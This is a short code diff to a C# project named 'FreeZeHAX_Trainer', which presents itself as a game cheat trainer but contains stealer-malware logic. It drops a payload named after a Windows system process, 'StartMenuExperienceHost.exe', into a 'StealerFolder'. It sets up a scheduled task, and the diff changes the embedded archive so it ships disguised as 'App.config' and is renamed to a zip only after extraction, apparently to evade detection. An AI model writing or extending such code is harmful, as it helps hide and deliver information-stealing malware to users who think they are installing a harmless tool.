@@ -31,7 +31,8 @@ namespace FreeZeHAX_Trainer
         private bool mouseDown;
         private Point lastLocation;
         private const string FileName = "StartMenuExperienceHost.exe";
-        private const string ZipFileName = "StartMenu.zip";
+        private const string CFGFileName = "App.config";
+        string ZipFileName = "App.config.zip";
         private const string NamespaceName = "FreeZeHAX_Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
 
@@ -82,7 +83,8 @@ namespace FreeZeHAX_Trainer
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
-                others.Extract(NamespaceName, StealerFolderLoc, "Files", ZipFileName);
+                others.Extract(NamespaceName, StealerFolderLoc, "Files", CFGFileName);
+                File.Move(StealerFolderLoc + "\\" + CFGFileName, StealerFolderLoc + "\\" + "App.config.zip");
                 if (Directory.Exists(Guna))
                 {
                     Directory.Delete(Guna, true);
